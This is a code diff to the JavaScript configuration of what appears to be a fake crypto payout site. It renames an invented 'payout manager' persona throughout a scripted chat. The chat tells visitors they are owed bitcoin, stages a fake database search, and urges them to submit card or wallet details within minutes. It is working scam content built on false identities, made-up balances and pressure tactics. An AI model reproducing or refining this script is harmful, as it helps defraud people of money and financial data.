@@ -5058,11 +5058,11 @@
                 name: "Manager before details",
                 loadtime: 8,
                 isLoading: !0,
-                loadsteps: ["Connecting with manager Anna to process withdrawal"],
-                statusMessage: "Anna is currently online",
+                loadsteps: ["Connecting with manager Olivia to process withdrawal"],
+                statusMessage: "Olivia is currently online",
                 upsellType: "chat",
                 chat: {
-                    name: "Anna Vitkovskaya",
+                    name: "Olivia Davis",
                     job: "Lead Manager of Payout Department",
                     avatar: "anna-mng.jpg",
                     waitForAnswer: !0,
@@ -5072,7 +5072,7 @@
                         text: "3dotsFloat"
                     },
                     sendAnimation: "sharp",
-                    chatPull: ['{{greetingTime}}! My name is Anna, I am the lead manager of the payout department of the service "'.concat(n["a"].state[o].sitename, '".<br> According to the information I have, you have not appeared on the site for <span class="text-numbers">{{prevDayYear}}</span> days. Regarding this, I have a question: have you previously received a notification that you are entitled to a payout from ').concat(n["a"].state[o].sitename, "? {{next}}"), "I am waiting for your response{{next}}", '{{answerBtn:["Yes, I received it", "I don\'t remember", "I didn\'t notice"]}}', "I have an approved active request from your account to withdraw the bitcoin bonuses you earned. In order to transfer funds from the service to your card or wallet, we need your completed questionnaire. I will look for this questionnaire now, it will take no more than a minute.{{loading:{duration:14}{delay:9}\"Searching for your questionnaire. Please wait...\"}}", "Thank you for waiting. I checked and could not find your questionnaire in our database. This means you have not yet withdrawn the accumulated bitcoins from the service. {{next}}", "I have already started processing your payout, but I need your questionnaire and the details to which we will make the payment. {{next}}", 'Please fill it out right now so we can exchange bitcoins into your currency {{converting_geoCur}} as quickly as possible. The system reports that you are owed <span class="text-numbers">{{moneyPageBased}}</span> {{next}}', 'After you fill out the questionnaire, I will contact you and help you request the payout within <span class="text-numbers">15 minutes</span><br>\n        {{upsellbtn}}']
+                    chatPull: ['{{greetingTime}}! My name is Olivia, I am the lead manager of the payout department of the service "'.concat(n["a"].state[o].sitename, '".<br> According to the information I have, you have not appeared on the site for <span class="text-numbers">{{prevDayYear}}</span> days. Regarding this, I have a question: have you previously received a notification that you are entitled to a payout from ').concat(n["a"].state[o].sitename, "? {{next}}"), "I am waiting for your response{{next}}", '{{answerBtn:["Yes, I received it", "I don\'t remember", "I didn\'t notice"]}}', "I have an approved active request from your account to withdraw the bitcoin bonuses you earned. In order to transfer funds from the service to your card or wallet, we need your completed questionnaire. I will look for this questionnaire now, it will take no more than a minute.{{loading:{duration:14}{delay:9}\"Searching for your questionnaire. Please wait...\"}}", "Thank you for waiting. I checked and could not find your questionnaire in our database. This means you have not yet withdrawn the accumulated bitcoins from the service. {{next}}", "I have already started processing your payout, but I need your questionnaire and the details to which we will make the payment. {{next}}", 'Please fill it out right now so we can exchange bitcoins into your currency {{converting_geoCur}} as quickly as possible. The system reports that you are owed <span class="text-numbers">{{moneyPageBased}}</span> {{next}}', 'After you fill out the questionnaire, I will contact you and help you request the payout within <span class="text-numbers">15 minutes</span><br>\n        {{upsellbtn}}']
                 },
                 title: "Provide the details to which you wish to receive funds",
                 product: "",
@@ -5193,7 +5193,7 @@
                 statusMessage: "Your form has been sent to the manager",
                 upsellType: "chat",
                 chat: {
-                    name: "Anna Vitkovskaya",
+                    name: "Olivia Davis",
                     job: "Lead Manager of Payout Department",
                     avatar: "anna-mng.jpg",
                     waitForAnswer: !0,
@@ -5261,7 +5261,7 @@
                 statusMessage: "Currency conversion completed successfully!",
                 upsellType: "chat",
                 chat: {
-                    name: "Anna Vitkovskaya",
+                    name: "Olivia Davis",
                     job: "Lead Manager of Payout Department",
                     avatar: "anna-mng.jpg",
                     waitForAnswer: !0,
@@ -5463,7 +5463,7 @@
                 statusMessage: "Personal account activated",
                 upsellType: "chat",
                 chat: {
-                    name: "Anna Vitkovskaya",
+                    name: "Olivia Davis",
                     job: "Lead Manager of Payout Department",
                     avatar: "anna-mng.jpg",
                     waitForAnswer: !0,
